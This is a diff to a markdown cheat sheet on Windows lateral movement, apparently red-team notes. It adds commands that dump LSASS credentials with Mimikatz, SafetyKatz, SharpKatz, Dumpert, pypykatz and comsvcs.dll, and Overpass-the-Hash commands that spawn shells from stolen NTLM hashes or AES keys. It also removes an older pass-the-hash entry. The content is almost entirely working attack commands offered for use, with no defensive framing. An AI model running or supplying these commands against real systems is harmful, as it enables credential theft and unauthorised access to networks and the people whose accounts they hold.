@@ -1,5 +1,7 @@
 # Lateral Movement
 * [General](#General)
+* [Dumping LSASS](#Dumping-LSASS)
+* [Overpass The Hash](Overpass-The-Hash)
 * [Mimikatz](#Mimikatz) 
 * [Check Local Admin Access](#Check-Local-Admin-Access)  
 
@@ -29,6 +31,58 @@ Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content co
 Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content computers.txt)
 ```
 
+## Dumping LSASS
+#### Dump credentials on a local machine using Mimikatz.
+```
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 
+```
+
+#### Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
+```
+SafetyKatz.exe "sekurlsa::ekeys"
+```
+
+#### Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
+```
+SharpKatz.exe --Command ekeys
+```
+
+#### Dump credentials using Dumpert (Direct System Calls and API unhooking)
+```
+rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
+```
+
+#### Using pypykatz (Mimikatz functionality in Python)
+```
+pypykatz.exe live lsa
+```
+
+#### Using comsvcs.dll
+```
+tasklist /FI "IMAGENAME eq lsass.exe"
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass
+process ID> C:\Users\Public\lsass.dmp full 
+```
+
+#### From a Linux attacking machine using impacket.
+
+
+#### From a Linux attacking machine using Physmem2profit
+
+## Overpass The Hash
+- Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)
+
+#### Mimikatz
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.exe"'
+```
+
+#### SafetyKatz
+```
+SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:cmd.exe" "exit" 
+```
+
 ## Mimikatz
 #### Mimikatz dump credentials on local machine
 ```
@@ -38,11 +92,6 @@ Invoke-Mimikatz -Dumpcreds
 #### Mimikatz dump credentials on multiple remote machines
 ```
 Invoke-Mimikatz -Dumpcreds -ComputerName @("<COMPUTERNAME 1>","<COMPUTERNAME2>")
-```
-
-#### Mimikatz start powershell pass the hash (run as local admin)
-```
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.exe"'
 ```
 
 #### Mimikatz dump SAM
